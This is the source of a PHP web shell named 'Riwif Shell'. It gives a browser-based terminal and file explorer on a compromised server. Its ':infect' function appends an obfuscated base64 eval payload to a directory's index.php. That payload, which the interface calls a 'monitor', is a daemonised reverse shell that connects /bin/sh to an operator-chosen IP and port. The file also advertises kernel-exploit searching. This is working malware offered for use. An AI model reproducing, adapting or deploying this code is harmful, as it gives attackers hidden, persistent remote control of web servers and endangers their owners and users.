<?php session_start();

###################################
#           Riwif Shell           #
#       (c) Github.com/graniet    #
###################################

$user = "root";
$pass = "7b24afc8bc80e548d66c4e7ff72171c5";


function return_directory($path){
    $test = explode('/', $path);
    array_pop($test);
    echo implode('/',$test);
    die();
}

if(isset($_POST['directory']) && $_POST['directory'] != '' && isset($_POST['new']) && $_POST['new'] != ''){
    $directory = $_POST['directory'];
    $new_folder = $_POST['new'];
    if($new_folder != '.' && $new_folder != ''){
        if($new_folder == ".."){
            return_directory($directory);
        }
        else{
            $directory = $directory."/".$new_folder;
            echo $directory;
            exit();
        }
    }
    die();
}

function get_self(){
		$query = (isset($_SERVER["QUERY_STRING"])&&(!empty($_SERVER["QUERY_STRING"])))?"?".$_SERVER["QUERY_STRING"]:"";
		return htmlspecialchars($_SERVER["REQUEST_URI"].$query,2 | 1);
	}

if(isset($_POST['explorer']) && $_POST['explorer'] != '' && isset($_POST["pwd"]) && $_POST['pwd'] != ''){
    $explorer = $_POST['explorer'];
    $pwd = $_POST['pwd'];
    if(is_dir($pwd)){
        $dir_list = scandir($pwd);
        echo '<table style="width:100%">';
        foreach($dir_list as $value){
            if(!is_dir($pwd.'/'.$value) && $value != '..' && $value != '.'){
                $size = filesize($pwd.'/'.$value)." kb";
                $value_td = '<td class="file">'.$value.'</a>';
            }
            else{
                $size = "Directory";
                $value_td = '<td class="directory">'.$value.'</a>';
            }
            
            $right = substr(sprintf('%o', fileperms($pwd.'/'.$value)), -4);
            $user_group = posix_getpwuid(fileowner($pwd.'/'.$value));
            echo "<tr>".$value_td."<td>".$size."</td><td>".$right."</td><td>".$user_group['name']."</td></tr>";
        }
        echo '</table>';
    }
    die();
    
}

if(isset($_POST['infect']) && $_POST['infect'] != '' && isset($_POST['infectdir']) && $_POST['infectdir'] != ''){
    if($file = fopen($_POST['infectdir'].'/index.php', 'a+')){
        $ip = explode(':', $_POST['infect'])[0];
        $port = explode(':', $_POST['infect'])[1];
        $infector = '<?php $ip="'.$ip.'"; $port = "'.$port.'"; eval(base64_decode("DQpzZXRfdGltZV9saW1pdCAoMCk7DQokVkVSU0lPTiA9ICIxLjAiOw0KJGNodW5rX3NpemUgPSAxNDAwOw0KJHdyaXRlX2EgPSBudWxsOw0KJGVycm9yX2EgPSBudWxsOw0KJHNoZWxsID0gJ3VuYW1lIC1hOyB3OyBpZDsgL2Jpbi9zaCAtaSc7DQokZGFlbW9uID0gMDsNCiRkZWJ1ZyA9IDA7DQppZiAoZnVuY3Rpb25fZXhpc3RzKCdwY250bF9mb3JrJykpIHsNCgkkcGlkID0gcGNudGxfZm9yaygpOw0KCQ0KCWlmICgkcGlkID09IC0xKSB7DQoJCXByaW50aXQoIkVSUk9SOiBDYW4ndCBmb3JrIik7DQoJCWV4aXQoMSk7DQoJfQ0KCQ0KCWlmICgkcGlkKSB7DQoJCWV4aXQoMCk7DQoJfQ0KCWlmIChwb3NpeF9zZXRzaWQoKSA9PSAtMSkgew0KCQlwcmludGl0KCJFcnJvcjogQ2FuJ3Qgc2V0c2lkKCkiKTsNCgkJZXhpdCgxKTsNCgl9DQoNCgkkZGFlbW9uID0gMTsNCn0gZWxzZSB7DQoJcHJpbnRpdCgiV0FSTklORzogRmFpbGVkIHRvIGRhZW1vbmlzZS4gIFRoaXMgaXMgcXVpdGUgY29tbW9uIGFuZCBub3QgZmF0YWwuIik7DQp9DQpjaGRpcigiLyIpOw0KdW1hc2soMCk7DQokc29jayA9IGZzb2Nrb3BlbigkaXAsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsIDMwKTsNCmlmICghJHNvY2spIHsNCglwcmludGl0KCIkZXJyc3RyICgkZXJybm8pIik7DQoJZXhpdCgxKTsNCn0NCiRkZXNjcmlwdG9yc3BlYyA9IGFycmF5KA0KICAgMCA9PiBhcnJheSgicGlwZSIsICJyIiksDQogICAxID0+IGFycmF5KCJwaXBlIiwgInciKSwNCiAgIDIgPT4gYXJyYXkoInBpcGUiLCAidyIpDQopOw0KDQokcHJvY2VzcyA9IHByb2Nfb3Blbigkc2hlbGwsICRkZXNjcmlwdG9yc3BlYywgJHBpcGVzKTsNCg0KaWYgKCFpc19yZXNvdXJjZSgkcHJvY2VzcykpIHsNCglwcmludGl0KCJFUlJPUjogQ2FuJ3Qgc3Bhd24gc2hlbGwiKTsNCglleGl0KDEpOw0KfQ0Kc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMF0sIDApOw0Kc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMV0sIDApOw0Kc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMl0sIDApOw0Kc3RyZWFtX3NldF9ibG9ja2luZygkc29jaywgMCk7DQoNCnByaW50aXQoIlN1Y2Nlc3NmdWxseSBvcGVuZWQgcmV2ZXJzZSBzaGVsbCB0byAkaXA6JHBvcnQiKTsNCg0Kd2hpbGUgKDEpIHsNCglpZiAoZmVvZigkc29jaykpIHsNCgkJcHJpbnRpdCgiRVJST1I6IFNoZWxsIGNvbm5lY3Rpb24gdGVybWluYXRlZCIpOw0KCQlicmVhazsNCgl9DQoJaWYgKGZlb2YoJHBpcGVzWzFdKSkgew0KCQlwcmludGl0KCJFUlJPUjogU2hlbGwgcHJvY2VzcyB0ZXJtaW5hdGVkIik7DQoJCWJyZWFrOw0KCX0NCgkkcmVhZF9hID0gYXJyYXkoJHNvY2ssICRwaXBlc1sxXSwgJHBpcGVzWzJdKTsNCgkkbnVtX2NoYW5nZWRfc29ja2V0cyA9IHN0cmVhbV9zZWxlY3QoJHJlYWRfYSwgJHdyaXRlX2EsICRlcnJvcl9hLCBudWxsKTsNCglpZiAoaW5fYXJyYXkoJHNvY2ssICRyZWFkX2EpKSB7DQoJCWlmICgkZGVidWcpIHByaW50aXQoIlNPQ0sgUkVBRCIpOw0KCQkkaW5wdXQgPSBmcmVhZCgkc29jaywgJGNodW5rX3NpemUpOw0KCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLOiAkaW5wdXQiKTsNCgkJZndyaXRlKCRwaXBlc1swXSwgJGlucHV0KTsNCgl9DQoJaWYgKGluX2FycmF5KCRwaXBlc1sxXSwgJHJlYWRfYSkpIHsNCgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUIFJFQUQiKTsNCgkJJGlucHV0ID0gZnJlYWQoJHBpcGVzWzFdLCAkY2h1bmtfc2l6ZSk7DQoJCWlmICgkZGVidWcpIHByaW50aXQoIlNURE9VVDogJGlucHV0Iik7DQoJCWZ3cml0ZSgkc29jaywgJGlucHV0KTsNCgl9DQoNCglpZiAoaW5fYXJyYXkoJHBpcGVzWzJdLCAkcmVhZF9hKSkgew0KCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlIgUkVBRCIpOw0KCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMl0sICRjaHVua19zaXplKTsNCgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RERVJSOiAkaW5wdXQiKTsNCgkJZndyaXRlKCRzb2NrLCAkaW5wdXQpOw0KCX0NCn0NCg0KZmNsb3NlKCRzb2NrKTsNCmZjbG9zZSgkcGlwZXNbMF0pOw0KZmNsb3NlKCRwaXBlc1sxXSk7DQpmY2xvc2UoJHBpcGVzWzJdKTsNCnByb2NfY2xvc2UoJHByb2Nlc3MpOw0KDQpmdW5jdGlvbiBwcmludGl0ICgkc3RyaW5nKSB7DQoJaWYgKCEkZGFlbW9uKSB7DQoJCXByaW50ICIkc3RyaW5nXG4iOw0KCX0NCn0=")); ?>';
        fwrite($file, $infector);
        fclose($file);
        echo 'ok';
    }
    die();
}

if(isset($_POST['terminal_query']) && $_POST['terminal_query'] != ''){
    if(stristr($_POST['terminal_query'],':help')){
        echo '<table style="width:100%">
      <tr>
        <td>:help</td>
        <td class="infotd">Show help bullet</td>
      </tr>
      <tr>
        <td>:kernel</td>
        <td class="infotd">Search kernel exploit</td>
      </tr>
      <tr>
        <td>:inspector</td>
        <td class="infotd">Download inspector.py on server</td>
      </tr>
      <tr>
        <td>:infect</td>
        <td class="infotd">Install deleting monitor</td>
      </tr>
      <tr>
        <td>:explorer</td>
        <td class="infotd">Show file explorer</td>
      </tr>
      <tr>
        <td>:show</td>
        <td class="infotd">Close file explorer</td>
      </tr>
    </table>';
    }
    die();
}
?>
<head>
    <title></title>
    <script src="jquery.js">
    </script>
    <style>
    html,body
        {
            margin: 0px;
        }
        .container-terminal
        {
            border-top: 1px solid gainsboro;
            width: 80%;
            margin-left: auto;
            margin-right: auto;
            height: 40%;
            margin-top: 10px;
            overflow: scroll;
        }
        header{
            background-color: #2C3E50;
            padding: 10px;
            border-bottom: 1px solid #22313F;
            color: whitesmoke;
            font-size: 0.9em;
        }
        .command_line{padding-bottom: 5px; margin-left: auto; margin-right: auto; width: 80%;border-bottom: 1px solid gainsboro; }
        .name{ font-family: monospace; }
        label {
            font-family: monospace;
            font-size: 0.9em;
            float: left;
        }
        input{
            border: 0px;
            margin-top: 0px;
            padding-left: 5px;
        }
        input:focus{
            outline:0 !important;
        }
        .information{
            margin: 0;
            background: #16a085;
            color: rgb(255, 255, 255);
            height: 20px;
            padding: 5px;
        }
        table, th, td {
            border-left: 1px solid gainsboro;
            border-right: 1px solid gainsboro;
            border-bottom: 1px solid gainsboro;
            border-collapse: collapse;
            border-collapse: collapse;
        }
        th, td {
            padding: 5px;
            text-align: left;    
        }
        .infotd{
            text-align: left;
        }
        .explorer{
            width: 90%;
            margin-left: auto;
            margin-right: auto;
            margin-top: 10px;
            border: 1px solid gainsboro;
            display: none;
            opacity: 0;
            border-bottom: 0px;
        }
        .explorerHead{
            height: 15px;
            background-color: #2c3e50;
            color: white;
            font-family: monospace;
            padding: 4px;
            font-size: 0.8em;
        }
        .explorerload{
            text-align: center;
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <header>
        <div class="name">Riwif@<?= gethostname(); ?> AT <?= $_SERVER['SCRIPT_FILENAME'] ?></div>
    </header>
    <div class="container-terminal"></div>
    <div class="command_line">
        <label><b><?= get_current_user() ?></b>@<?= substr($_SERVER['SCRIPT_FILENAME'],1)." > "?></label>
        <input id="command" type="text" autofocus/>
    </div>
    <div class="explorer">
        <div class="explorerHead"></div>
        <div class="containerExplorer"><p class="explorerload">Loading</p></div>
    </div>
</body>
<script>

function directory_shower(){
    $('.directory').click(function(){
        var directory = $(this).html();
        $.post(original, {directory: current, new:directory}, function(data){
            current = data;
            $.post(original, {explorer:"1", pwd:current}, function(data){
                $('.containerExplorer').html(data);
                    directory_shower();
                })
                $('label').html(current + " > ");
            })
        })
}
var location_script = '<?= $_SERVER['SCRIPT_FILENAME'] ?>';
var original = '<?php echo get_self(); ?>';
var current = '<?= getcwd() ?>'
document.getElementById('command').addEventListener('keydown', function(e) {
    var element = document.getElementById('command');
    if(e.keyCode == 13){
        var value = this.value;
        e.preventDefault();
        element.value = "";
        if(value == "clear"){
            $('.container-terminal').html('');
        }
        else if(value == ":infect"){
            if(confirm('Install monitor here '+current+' ?')){
                var server = prompt('server for ping?');
                var port = prompt('port ?');
                var string = server+":"+port;
                $.post(original, {infect:string,infectdir:current}, function(data){
                    if(data == "ok"){
                        $('.container-terminal').append('<p class="information">We pinged all Hours if backdoor deleted please nc -l '+port+'</p>');
                    }
                    else{
                        alert('error');
                    }
                })
            }
        }
        else if(value == ":explorer"){
            $('.explorerHead').html(current);
            $('.container-terminal').animate({
                height: '0%'
            }, 1000, function(){
                $('.explorer').css('display', 'block');
                $('.explorer').animate({
                    opacity: 1
                }, 1000, function(){
                    $.post(original, {explorer:"1", pwd:current}, function(data){
                        $('.containerExplorer').html(data);
                        directory_shower();
                    });
                });
            })
        }
        else if(value == ':show'){
            $('.explorer').animate({
                opacity: 0
            }, 1000, function(){
                $('.explorer').css('display', 'none');
                $('.container-terminal').animate({
                    height: '40%'
                }, 1000)
            })
        }
        else if(value == "help"){
            var help = ""
        }
        $.post(original, {terminal_query: value}, function(data){
            var old = $('.container-terminal').html();
            $('.container-terminal').html(old + data);
        });
        
    }
    $('label').html(current + " > ");
}, false);
$(document).ready(function(){
    $('label').html(current + " > ");
    if($('.container-terminal').html() == ''){
        $('.container-terminal').html('<p class="information">You can use :help</p>');
    }
})
</script>